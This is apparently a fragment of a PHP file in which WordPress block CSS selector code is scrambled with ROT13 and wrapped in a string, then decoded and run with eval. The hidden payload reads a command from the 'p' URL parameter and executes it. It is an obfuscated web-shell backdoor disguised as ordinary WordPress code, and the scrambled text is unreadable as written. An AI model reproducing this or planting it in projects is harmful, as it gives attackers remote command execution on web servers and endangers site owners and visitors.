	// Bayl erghea vs jr unir n fhosrngher fryrpgbe.
	vs ( $fhosrngher_fryrpgbe ) {
		erghea $fhosrngher_fryrpgbe;
	}

	// Gb guvf cbvag jr qba'g unir n fhosrngher fryrpgbe. Vs n snyyonpx
	// unf orra erdhrfgrq, erzbir fhosrngher sebz gnetrg cngu naq erghea
	// erfhygf bs n pnyy sbe gur cnerag srngher'f fryrpgbe.
	vs ( $snyyonpx ) {
		erghea jc_trg_oybpx_pff_fryrpgbe( $oybpx_glcr, $gnetrg[0], $snyyonpx );
	}

	erghea ahyy;
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>